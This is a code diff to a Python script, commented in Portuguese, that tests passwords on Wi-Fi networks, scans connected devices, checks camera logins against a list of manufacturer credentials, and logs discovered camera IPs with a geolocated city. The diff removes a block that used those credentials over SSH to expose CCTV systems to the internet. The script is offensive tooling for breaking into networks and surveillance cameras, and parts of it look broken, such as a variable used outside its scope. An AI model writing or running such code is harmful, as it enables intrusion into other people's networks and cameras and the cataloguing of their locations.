@@ -6,6 +6,7 @@ import subprocess
 import nmap
 import os
 import sys
+import geocoder
 
 # Função para obter o endereço IP do roteador padrão
 def get_router_ip():
@@ -96,32 +97,21 @@ def testar_senhas(networks):
         print("\nDispositivos conectados na rede:")
         for dispositivo in dispositivos_conectados:
             print(f"IP: {dispositivo['IP']} - MAC: {dispositivo['MAC']}")
+
+        # Salva o IP da câmera juntamente com o ponto de referência de localização em um arquivo
+        with open("lista_cameras.txt", "a") as file:
+            ponto_referencia = obter_ponto_referencia(dispositivos_conectados[0]['IP'])
+            file.write(f"IP: {dispositivos_conectados[0]['IP']} - Local: {ponto_referencia}\n")
+
         print("-------------------------------------------")
 
-        if network.ssid in credentials:
-            cam_user = credentials[network.ssid]["user"]
-            cam_password = credentials[network.ssid]["password"]
-
-            ssh = paramiko.SSHClient()
-            ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
-
-            try:
-                ssh.connect(dispositivos_conectados[0]['IP'], username=cam_user, password=cam_password)
-
-                command = f'ip nat inside source static tcp {internal_ip} {internal_port} interface {external_interface_port}'
-                ssh.exec_command(command)
-
-                ssh.exec_command('write memory')
-
-                print("CFTV configurado com sucesso para acesso pela internet.")
-            except paramiko.AuthenticationException:
-                print("Falha ao fazer login no host da câmera. Autenticação falhou.")
-            except paramiko.SSHException:
-                print("Falha ao estabelecer conexão SSH com o host da câmera.")
-            finally:
-                ssh.close()
-        else:
-            print("Nenhuma credencial disponível para o fabricante do dispositivo.")
+# Função para obter o ponto de referência de localização com base no endereço IP
+def obter_ponto_referencia(ip):
+    g = geocoder.ip(ip)
+    if g.ok:
+        return g.city
+    else:
+        return ""
 
 # Função para verificar se as dependências estão instaladas e instalar, se necessário
 def verificar_dependencias():
@@ -130,10 +120,11 @@ def verificar_dependencias():
         import scapy
         import paramiko
         import nmap
+        import geocoder
     except ImportError:
         print("Instale as dependências necessárias antes de executar o script.")
 
-# Function to check credentials for a specific manufacturer
+# Função para verificar as credenciais de acesso à câmera
 def check_credentials(manufacturer, user, password):
     with open('camlist.txt', 'r') as file:
         for line in file:
@@ -176,3 +167,10 @@ while True:
 
     # Testa as senhas para as redes Wi-Fi
     testar_senhas(networks)
+
+    # Atualiza a lista de câmeras no arquivo com os pontos de referência de localização
+    with open("lista_cameras.txt", "a") as file:
+        for dispositivo in dispositivos_conectados:
+            ip = dispositivo['IP']
+            ponto_referencia = obter_ponto_referencia(ip)
+            file.write(f"IP: {ip} - Local: {ponto_referencia}\n")
